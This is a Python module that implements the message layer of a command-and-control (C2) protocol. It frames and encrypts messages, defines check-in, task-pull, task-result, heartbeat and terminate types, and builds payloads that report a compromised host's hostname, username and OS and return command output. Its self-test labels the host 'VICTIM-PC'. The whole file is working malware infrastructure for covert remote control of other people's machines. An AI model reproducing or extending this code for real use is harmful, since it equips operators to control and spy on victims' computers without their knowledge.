"""
Binary envelope packing and unpacking for the C2 protocol.

Wire format (7-byte header + body):
    [ magic: 2B | version: 1B | length: 4B | nonce: 12B | ciphertext+tag ]

Struct format '!HBI': big-endian, uint16 + uint8 + uint32.
"""
import json
import struct
import time
import uuid

from common.crypto import decrypt, encrypt, NONCE_SIZE_BYTES
from common.utils import CryptoError, ProtocolError


# Constants
MAGIC            = 0xC2C2
PROTOCOL_VERSION = 0x01
HEADER_FORMAT    = '!HBI'
HEADER_SIZE      = struct.calcsize(HEADER_FORMAT)   # 7 bytes

# Message type identifiers
MSG_CHECKIN       = 'CHECKIN'
MSG_TASK_PULL     = 'TASK_PULL'
MSG_TASK_RESULT   = 'TASK_RESULT'
MSG_TASK_DISPATCH = 'TASK_DISPATCH'
MSG_HEARTBEAT     = 'HEARTBEAT'
MSG_TERMINATE     = 'TERMINATE'

VALID_MSG_TYPES = {
    MSG_CHECKIN, MSG_TASK_PULL, MSG_TASK_RESULT,
    MSG_TASK_DISPATCH, MSG_HEARTBEAT, MSG_TERMINATE,
}


# pack / unpack
def pack(payload_dict: dict, key: bytes) -> bytes:
    """Serialise, encrypt, and frame a payload dict into a C2 envelope."""
    if not payload_dict or not isinstance(payload_dict, dict):
        raise ProtocolError("pack: payload_dict must be a non-empty dict")

    try:
        plaintext = json.dumps(payload_dict).encode('utf-8')
    except (TypeError, ValueError) as e:
        raise ProtocolError(f"pack: payload not JSON-serialisable: {e}") from e

    ciphertext_with_tag, nonce = encrypt(plaintext, key)

    # nonce prepended to body so receiver can split at fixed offset [:12]
    body   = nonce + ciphertext_with_tag
    header = struct.pack(HEADER_FORMAT, MAGIC, PROTOCOL_VERSION, len(body))
    return header + body


def unpack(raw: bytes, key: bytes) -> dict:
    """Validate, decrypt, and deserialise a raw C2 envelope into a dict."""
    if len(raw) < HEADER_SIZE:
        raise ProtocolError(
            f"unpack: too short for header — got {len(raw)}B, need {HEADER_SIZE}B"
        )

    try:
        magic, version, body_length = struct.unpack(HEADER_FORMAT, raw[:HEADER_SIZE])
    except struct.error as e:
        raise ProtocolError(f"unpack: header unpack failed: {e}") from e

    if magic != MAGIC:
        raise ProtocolError(
            f"unpack: bad magic — expected 0x{MAGIC:04X}, got 0x{magic:04X}"
        )
    if version != PROTOCOL_VERSION:
        raise ProtocolError(
            f"unpack: unsupported version 0x{version:02X}"
        )

    expected_total = HEADER_SIZE + body_length
    if len(raw) < expected_total:
        raise ProtocolError(
            f"unpack: frame truncated — declared {body_length}B body, "
            f"only {len(raw) - HEADER_SIZE}B available"
        )

    body = raw[HEADER_SIZE : HEADER_SIZE + body_length]

    min_body = NONCE_SIZE_BYTES + 16   # nonce + GCM tag minimum
    if len(body) < min_body:
        raise ProtocolError(
            f"unpack: body too short — got {len(body)}B, need {min_body}B"
        )

    nonce               = body[:NONCE_SIZE_BYTES]
    ciphertext_with_tag = body[NONCE_SIZE_BYTES:]

    plaintext = decrypt(ciphertext_with_tag, nonce, key)   # CryptoError propagates

    try:
        payload_dict = json.loads(plaintext.decode('utf-8'))
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        raise ProtocolError(f"unpack: decrypted payload is not valid JSON: {e}") from e

    if not isinstance(payload_dict, dict):
        raise ProtocolError(f"unpack: expected JSON object, got {type(payload_dict)}")

    return payload_dict


# Payload builders
def _base_payload(msg_type: str, session_id: str = None) -> dict:
    """Return mandatory fields present in every message."""
    if msg_type not in VALID_MSG_TYPES:
        raise ProtocolError(f"unknown msg_type '{msg_type}'")
    return {
        'msg_type':   msg_type,
        'session_id': session_id,
        'timestamp':  int(time.time()),
        'nonce':      uuid.uuid4().hex,   # replay protection — stored by server
        'payload':    {},
    }


def build_checkin(hostname: str, username: str, os_info: str,
                  agent_ver: str, jitter_pct: int) -> dict:
    """Build a CHECKIN payload dict."""
    msg = _base_payload(MSG_CHECKIN)
    msg['payload'] = {
        'hostname':   hostname,
        'username':   username,
        'os':         os_info,
        'agent_ver':  agent_ver,
        'jitter_pct': jitter_pct,
    }
    return msg


def build_task_pull(session_id: str) -> dict:
    """Build a TASK_PULL payload dict."""
    msg = _base_payload(MSG_TASK_PULL, session_id=session_id)
    msg['payload'] = {'session_id': session_id}
    return msg


def build_task_result(session_id: str, task_id: str, stdout: str,
                      stderr: str, exit_code: int, duration_ms: int) -> dict:
    """Build a TASK_RESULT payload dict."""
    msg = _base_payload(MSG_TASK_RESULT, session_id=session_id)
    msg['payload'] = {
        'task_id':     task_id,
        'stdout':      stdout,
        'stderr':      stderr,
        'exit_code':   exit_code,
        'duration_ms': duration_ms,
    }
    return msg


# Self-test
if __name__ == '__main__':
    from common.crypto import get_session_key

    print("Running message_format self-test...")
    key = get_session_key()

    payloads = [
        build_checkin('VICTIM-PC', 'jdoe', 'Windows 10', '1.0.0', 20),
        build_task_pull('test-session-id'),
        build_task_result('test-session-id', 'test-task-id', 'output', '', 0, 142),
        _base_payload(MSG_HEARTBEAT, session_id='test-session-id'),
    ]

    for p in payloads:
        raw       = pack(p, key)
        recovered = unpack(raw, key)
        assert recovered['msg_type'] == p['msg_type']
        print(f"  [OK] {p['msg_type']} — {len(raw)} bytes")

    # Wrong magic
    raw = pack(payloads[0], key)
    try:
        unpack(b'\x00\x00' + raw[2:], key)
    except ProtocolError:
        print("  [OK] wrong magic raises ProtocolError")

    # Truncated frame
    try:
        unpack(raw[:4], key)
    except ProtocolError:
        print("  [OK] truncated frame raises ProtocolError")

    # Tampered body
    try:
        unpack(raw[:7] + bytes([raw[7] ^ 0xFF]) + raw[8:], key)
    except CryptoError:
        print("  [OK] tampered body raises CryptoError")

    print("\nAll self-tests passed.")